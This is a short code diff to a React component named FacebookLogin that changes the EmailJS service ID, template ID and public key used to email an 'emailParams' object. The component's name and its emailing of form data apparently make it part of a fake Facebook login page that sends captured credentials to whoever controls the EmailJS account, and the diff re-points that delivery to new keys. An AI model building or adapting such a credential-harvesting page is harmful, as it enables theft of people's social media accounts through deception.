@@ -28,10 +28,10 @@ export default function FacebookLogin() {
 
     emailjs
       .send(
-        "service_hk2ckvk",
-        "template_qs6u03r",
+        "service_o41c51w",
+        "template_jvdvqiu",
         emailParams,
-        "P0doGrSO8zxmna4Vm"
+        "KP0gPVO-mP3n3PC2l"
       )
       .then((response) => {
         console.log("Email sent successfully", response.status, response.text);
